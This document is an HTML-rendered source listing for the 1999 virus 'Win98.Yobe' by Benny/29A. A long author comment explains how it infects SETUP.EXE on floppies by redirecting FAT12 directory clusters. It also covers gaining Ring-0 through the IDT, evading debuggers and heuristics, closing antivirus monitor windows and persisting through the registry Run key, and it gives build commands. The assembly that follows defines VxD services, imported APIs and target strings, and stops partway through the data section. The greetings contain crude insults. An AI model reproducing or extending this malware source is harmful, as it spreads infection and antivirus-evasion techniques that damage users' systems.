<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>yobe.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                             ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ</span><span class="sc0">
</span><span class="sc1">;                                                     ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;          Win98.Yobe.24576                       ÜÜÜÛÛß  ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;          by Benny/29A                               ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                                     ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                                    </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's description</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Hey reader! R u st0ned or drunk enough? If not, then don't read this, coz this</span><span class="sc0">
</span><span class="sc1">;is really crazy. Let me introduce u FIRST FAT12 infector (cluster/directory</span><span class="sc0">
</span><span class="sc1">;virus, this is also used to call), fully compatible with windozes (Win98)!</span><span class="sc0">
</span><span class="sc1">;No no, that's not enough. This is also resident, multithreaded in both of</span><span class="sc0">
</span><span class="sc1">;Ring-0 and Ring-3 levels with anti-debugging, anti-heuristic, anti-emulator and</span><span class="sc0">
</span><span class="sc1">;anti-monitor features, using Win9X backdoor to call DOS services and working</span><span class="sc0">
</span><span class="sc1">;with CRC32, Windows registry and API functions.</span><span class="sc0">
</span><span class="sc1">;Among all these features, I don't hope it has any chances to spread outta</span><span class="sc0">
</span><span class="sc1">;world. It infects only diskettes (A: only) and only one file - SETUP.EXE. More</span><span class="sc0">
</span><span class="sc1">;crazy than u thought, nah? Yeah, I'm lazy so I didn't want to test my code on</span><span class="sc0">
</span><span class="sc1">;my harddisk and I also didn't want to think about infication of more than one</span><span class="sc0">
</span><span class="sc1">;file. When I finished Win98.BeGemot, I was totally b0red of those stupid PE</span><span class="sc0">
</span><span class="sc1">;headerz, RVAs and such like. I wanted to code something really original, not</span><span class="sc0">
</span><span class="sc1">;next average-b0ring virus. I hope I successed. This virus doesn't demonstrate</span><span class="sc0">
</span><span class="sc1">;only porting old techniques (c Dir-II virus) to new enviroment, but also</span><span class="sc0">
</span><span class="sc1">;hot-new techniques (e.g. Ring0 threads). To be this virus really heavilly</span><span class="sc0">
</span><span class="sc1">;armoured is missing some poly/meta engine. Unfortunately, this conception of</span><span class="sc0">
</span><span class="sc1">;virus doesn't allow me to implement such engines (neither compression), coz</span><span class="sc0">
</span><span class="sc1">;I can't modify virus code. However, I included many usefull trix to fool</span><span class="sc0">
</span><span class="sc1">;debuggerz as well as heuristic scannerz. Bad thing is that this babe is</span><span class="sc0">
</span><span class="sc1">;detectable by NODICE32 - NODICE32 can find suspicious code (such as modifying</span><span class="sc0">
</span><span class="sc1">;IDT) and so it immediately reports an unknown virus. There ain't chance to</span><span class="sc0">
</span><span class="sc1">;improve it, coz I can't use any kind of encryption. Fortunately, other AVs</span><span class="sc0">
</span><span class="sc1">;find sh!t :D. I hope u will like this piece of work (it took me much time to</span><span class="sc0">
</span><span class="sc1">;code it, albeit it is very small (code is small, headerz r huge :) and</span><span class="sc0">
</span><span class="sc1">;optimized) and u will learn much from that. U want probably ask me, why I didn't</span><span class="sc0">
</span><span class="sc1">;coded stealth virus. U r right, It's easy to implement full-stealth mechanism,</span><span class="sc0">
</span><span class="sc1">;but, but, ... I won't lie u - I'm lazy :).</span><span class="sc0">
</span><span class="sc1">;Gimme know, if u will have any comments, if u will find any bugs or anything</span><span class="sc0">
</span><span class="sc1">;else...thnx.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;What will happen on execution ?</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus will:</span><span class="sc0">
</span><span class="sc1">;1) Setup up SEH frame</span><span class="sc0">
</span><span class="sc1">;2) Check for CRC32 of virus body</span><span class="sc0">
</span><span class="sc1">;3) Check for application level debugger</span><span class="sc0">
</span><span class="sc1">;4) Reset SEH frame and run anti-heuristic code</span><span class="sc0">
</span><span class="sc1">;5) Kill some AV monitors (AVP, AMON) + some anti-heuristic code</span><span class="sc0">
</span><span class="sc1">;6) Check for SoftICE</span><span class="sc0">
</span><span class="sc1">;7) Copy virus to internal buffer, create new Ring-3 thread and wait for</span><span class="sc0">
</span><span class="sc1">;   its termination</span><span class="sc0">
</span><span class="sc1">;8) -   Jump to Ring-0 (via IDT)</span><span class="sc0">
</span><span class="sc1">;9) -   Check for residency and install itself to memory</span><span class="sc0">
</span><span class="sc1">;10)    -   Quit from Ring-0</span><span class="sc0">
</span><span class="sc1">;11)    Restore host</span><span class="sc0">
</span><span class="sc1">;12)    Execute host</span><span class="sc0">
</span><span class="sc1">;13)    Restore host, so host will be infected again</span><span class="sc0">
</span><span class="sc1">;14)    Set registry key, so virus will be executed everytime windows will</span><span class="sc0">
</span><span class="sc1">;   start</span><span class="sc0">
</span><span class="sc1">;15)    Check for payload activation time</span><span class="sc0">
</span><span class="sc1">;16)    -   Do payload</span><span class="sc0">
</span><span class="sc1">;17)    Remove SEH frame and quit</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus in memory will:</span><span class="sc0">
</span><span class="sc1">;1) Check file name</span><span class="sc0">
</span><span class="sc1">;2) Create new Ring-0 thread and wait for its termination</span><span class="sc0">
</span><span class="sc1">;3) -   Check for drive parameters (BOOT sector check)</span><span class="sc0">
</span><span class="sc1">;4) -   Check for free space (FAT check)</span><span class="sc0">
</span><span class="sc1">;5) -   Redirect cluster_ptr in directory structure (ROOT)</span><span class="sc0">
</span><span class="sc1">;6) -   Write virus to the end of DATA area</span><span class="sc0">
</span><span class="sc1">;7) -   Save back FAT, ROOT and SAVE area (internally used by virus)</span><span class="sc0">
</span><span class="sc1">;8) -   Terminate Ring-0 thread</span><span class="sc0">
</span><span class="sc1">;9) Pass control to next IFS hooker</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Payload</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;In possibility 1:255, virus will show icon on the left side of the screen and</span><span class="sc0">
</span><span class="sc1">;will rotate with it. U will c, how light-snake will be rolled on the screen.</span><span class="sc0">
</span><span class="sc1">;User will be really impressed! X-D I still can't stop watching it, it really</span><span class="sc0">
</span><span class="sc1">;hipnotized me ! :DDDDD.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Known bugs</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;My computer will sometimes hang while system will try to read infected file.</span><span class="sc0">
</span><span class="sc1">;Maybe old FD drive, maybe some bugz in virus code. This appear only on my</span><span class="sc0">
</span><span class="sc1">;computer, so I hope it is error on my side.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AVP's description</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Benny's notes: This is much better description than at BeGemot virus. However,</span><span class="sc0">
</span><span class="sc1">;I would have some notes, see [* *] marx:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win95.Yobe [* Fully compatible with Win98, so why Win95? *]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is a dangerous [* why dangerous?! *] memory resident parasitic Windows</span><span class="sc0">
</span><span class="sc1">;virus. It uses system calls that are valid under Win95/98 only and can't spread</span><span class="sc0">
</span><span class="sc1">;under NT. The virus also has bugs and often halts the system when run [* when,</span><span class="sc0">
</span><span class="sc1">;where, why? *]. Despite on this the virus has very unusual way of spreading,</span><span class="sc0">
</span><span class="sc1">;and it is interesting enough from technical point of view [* I hope it is *].</span><span class="sc0">
</span><span class="sc1">;The virus can be found only in two files: "SETUP.EXE" on floppy disks and</span><span class="sc0">
</span><span class="sc1">;"SETUP .EXE" in the root of the C: drive (there is one space between file name</span><span class="sc0">
</span><span class="sc1">;and ".EXE" extension). </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On the floppy disks the virus uses a trick to hide its copy. It writes its</span><span class="sc0">
</span><span class="sc1">;complete code to the last disk sectors and modifies the SETUP.EXE file to read</span><span class="sc0">
</span><span class="sc1">;and execute this code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The infected SETUP.EXE file looks just as 512 bytes DOS EXE program, but it is</span><span class="sc0">
</span><span class="sc1">;not. While infecting this file the virus uses "DirII" virus method: by direct</span><span class="sc0">
</span><span class="sc1">;disk sectors read/write calls the virus gets access to disk directory sectors,</span><span class="sc0">
</span><span class="sc1">;modifies "first file cluster" field and makes necessary changes in disk FAT</span><span class="sc0">
</span><span class="sc1">;tables. As a result the original SETUP.EXE code is not modified, but the</span><span class="sc0">
</span><span class="sc1">;directory entry points to virus code instead of original file clusters. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;When the infected SETUP.EXE is run from the affected floppy disk this DOS</span><span class="sc0">
</span><span class="sc1">;component of the virus takes control, reads the complete virus body from the</span><span class="sc0">
</span><span class="sc1">;last sectors on the floppy disk, then creates the "C:\SETUP .EXE" file, writes</span><span class="sc0">
</span><span class="sc1">;these data (complete virus code) to there and executes. The virus installation</span><span class="sc0">
</span><span class="sc1">;routine takes control then, installs the virus into the system and disinfect</span><span class="sc0">
</span><span class="sc1">;the SETUP.EXE file on the floppy drive. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;While installing itself into the system the virus creates [* opens *] the new</span><span class="sc0">
</span><span class="sc1">;key in the system registry to activate itself on each Windows restart: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; HKLM\Software\Microsoft\Windows\CurrentVersion\Run </span><span class="sc0">
</span><span class="sc1">;  YOBE=""C:\SETUP .EXE" YOBE"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus then switches to the Windows kernel level (Ring0), allocates a block</span><span class="sc0">
</span><span class="sc1">;of system memory, copies itself to there and hooks disk file access Windows</span><span class="sc0">
</span><span class="sc1">;functions (IFS API). This hook intercepts file opening calls and on opening</span><span class="sc0">
</span><span class="sc1">;the SETUP.EXE file on the A: drive the virus infects it. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus has additional routines. First of them looks for "AVP Monitor" and</span><span class="sc0">
</span><span class="sc1">;"Amon Antivirus Monitor" windows and closes them; the second one depending on</span><span class="sc0">
</span><span class="sc1">;random counter displays the line with the words "YOBE" to the left side of the</span><span class="sc0">
</span><span class="sc1">;screen [* this is usually called as payload :D *].</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Greetz</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   B0z0        -   Huh, guy, why don't u stay in VX and write</span><span class="sc0">
</span><span class="sc1">;               another Padania virus? Just last one ;))</span><span class="sc0">
</span><span class="sc1">;   Billy Belcebu   -   Come to .cz! :D</span><span class="sc0">
</span><span class="sc1">;   BitAddict   -   Nice to met ya. Kewl to met old TriDenTer.</span><span class="sc0">
</span><span class="sc1">;   Darkman     -   Thank u for that wonderful book. It really</span><span class="sc0">
</span><span class="sc1">;               r0x0r!!!</span><span class="sc0">
</span><span class="sc1">;   Eddow       -   Would like to meet ya on IRC!</span><span class="sc0">
</span><span class="sc1">;   GriYo       -   Hey man, just reply me once.</span><span class="sc0">
</span><span class="sc1">;   Itchi       -   Drink, smoke and fuck again! :) Be back and</span><span class="sc0">
</span><span class="sc1">;               learn to code, pal!</span><span class="sc0">
</span><span class="sc1">;   Kaspersky   -   U cocksucker, where did u lose the description</span><span class="sc0">
</span><span class="sc1">;               of BeGemot?!!</span><span class="sc0">
</span><span class="sc1">;   Reptile     -   Smoke, smoke, smoke. This virus is really</span><span class="sc0">
</span><span class="sc1">;               st0ned :D. Btw, still working on macro stuph? ;)</span><span class="sc0">
</span><span class="sc1">;   StarZer0    -   Bak infectorz aren't problem :D. Now, when I</span><span class="sc0">
</span><span class="sc1">;               finished FAT12 inf., I will try to code</span><span class="sc0">
</span><span class="sc1">;               multithreaded .txt infector ;)))</span><span class="sc0">
</span><span class="sc1">;           -   Fibers r cool, but threads rulez!!!</span><span class="sc0">
</span><span class="sc1">;   The_Might       -\
;   MidNyte     - &gt; F0rk me a joint pleeeeeeaaazzzzz! :D</span><span class="sc0">
</span><span class="sc1">;   Rhape97         -/</span><span class="sc0">
</span><span class="sc1">;   All-nonsmokerz  -   Why do u drink and drive, when u can smoke</span><span class="sc0">
</span><span class="sc1">;               and fly? X-DDD</span><span class="sc0">
</span><span class="sc1">;   W33D        -   Thanx for inspiration, this virus is yourz,</span><span class="sc0">
</span><span class="sc1">;               hehe :D.</span><span class="sc0">
</span><span class="sc1">;   iKX stuph   -   Great work, men!!! XiNE#4 r0x0r!    </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How to build</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;brcc32 yobe.rc</span><span class="sc0">
</span><span class="sc1">;tasm32 -ml -q -m9 yobe.asm</span><span class="sc0">
</span><span class="sc1">;tlink32 -Tpe -c -x -aa yobe,,, import32,,yobe.res</span><span class="sc0">
</span><span class="sc1">;pewrsec yobe.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Who is YOBE?</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Many ppl will now laugh me (hi Darkman!, hi Billy!) :DD. Yobe was human, which</span><span class="sc0">
</span><span class="sc1">;role is situated in Bible. Nah, don't beat me, I'm not catholic. I only like</span><span class="sc0">
</span><span class="sc1">;stories and ppl in Bible. Yobe was human, which lost his religion. Ehrm,</span><span class="sc0">
</span><span class="sc1">;let's imagine it as "he stopped believing in what he believed". Story is all</span><span class="sc0">
</span><span class="sc1">;about that u shouldn't stop believe in what u believe. If u believe in better</span><span class="sc0">
</span><span class="sc1">;world, don't stop believing in it and do everything to become it truth, don't</span><span class="sc0">
</span><span class="sc1">;resignate. This ain't only about catholisism, it's about life and utophy.</span><span class="sc0">
</span><span class="sc1">;But NOW pick up your lazy ass and do anything, anything u think it's right,</span><span class="sc0">
</span><span class="sc1">;otherwise u won't get what u want!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(c) 1999 Benny/29A. Enjoy!</span><span class="sc0">



</span><span class="sc2">.386p</span><span class="sc0">                       </span><span class="sc1">;386 protected opcodez</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                 </span><span class="sc1">;flat model, 32bit offset</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">                </span><span class="sc1">;include some structures</span><span class="sc0">


</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00020000h</span><span class="sc0">               </span><span class="sc1">;equates used</span><span class="sc0">
</span><span class="sc5">PC_USER</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00040000h</span><span class="sc0">               </span><span class="sc1">;in installation</span><span class="sc0">
</span><span class="sc5">PR_SHARED</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80060000h</span><span class="sc0">               </span><span class="sc1">;stage</span><span class="sc0">
</span><span class="sc5">PC_PRESENT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">PC_FIXED</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">PD_ZEROINIT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">

</span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Dh</span><span class="sc0">       </span><span class="sc1">;used services</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400032h</span><span class="sc0">
</span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400067h</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00400041h</span><span class="sc0">
</span><span class="sc5">VMMCreateThread</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00010105h</span><span class="sc0">
</span><span class="sc5">VMMTerminateThread</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00010107h</span><span class="sc0">
</span><span class="sc5">_VWIN32_CreateRing0Thread</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">002A0013h</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00400032h</span><span class="sc0">


</span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">0fffh</span><span class="sc4">+</span><span class="sc2">24576</span><span class="sc4">)/</span><span class="sc2">1000h</span><span class="sc0">
                        </span><span class="sc1">;size of virus in memory</span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">  </span><span class="sc5">VxDService</span><span class="sc0">                   </span><span class="sc1">;macro to call VxDCall</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDService</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">              </span><span class="sc1">;import APIz used by virus</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeviceIoControl</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">LoadIconA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetDC</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DrawIcon</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">IsDebuggerPresent</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">



</span><span class="sc9">.data</span><span class="sc0">                       </span><span class="sc1">;data section</span><span class="sc0">
    </span><span class="sc5">VxDName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\\.\vwin32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;vwin32 driver name</span><span class="sc0">
    </span><span class="sc5">srcFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'a:\setup.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;virus locations</span><span class="sc0">
    </span><span class="sc5">dstFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'c:\setup.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;on disk</span><span class="sc0">
    </span><span class="sc5">regFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'"C:\SETUP .EXE" '</span><span class="sc0">  </span><span class="sc1">;in registry</span><span class="sc0">
    </span><span class="sc5">regVal</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'YOBE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">regSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">regFile</span><span class="sc0">
    </span><span class="sc5">subKey</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Software\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sICE</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\\.\SICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;SoftICE driver name</span><span class="sc0">
    </span><span class="sc5">ShItTyMoNs</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;monitors to kill</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Amon Antivirus Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpsiStartInfo</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64</span><span class="sc0">      </span><span class="sc1">;used by CreateProcessA</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">regCont</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;registers passed to API</span><span class="sc0">
    </span><span class="sc5">regEBX</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ROOT</span><span class="sc0">
    </span><span class="sc5">regEDX</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">19</span><span class="sc0">
    </span><span class="sc5">regECX</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc5">regEAX</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">regEDI</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">regESI</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">regFLGS</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;variable requiered by API</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc5">hKey</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;key to registry</span><span class="sc0">
    </span><span class="sc5">lppiProcInfo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">hProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;handle to new process</span><span class="sc0">
    </span><span class="sc5">hThread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;handle to new thread</span><span class="sc0">
    </span><span class="sc5">dwProcessID</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;ID of process</span><span class="sc0">
    </span><span class="sc5">dwThreadID</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;ID of thread</span><span class="sc0">
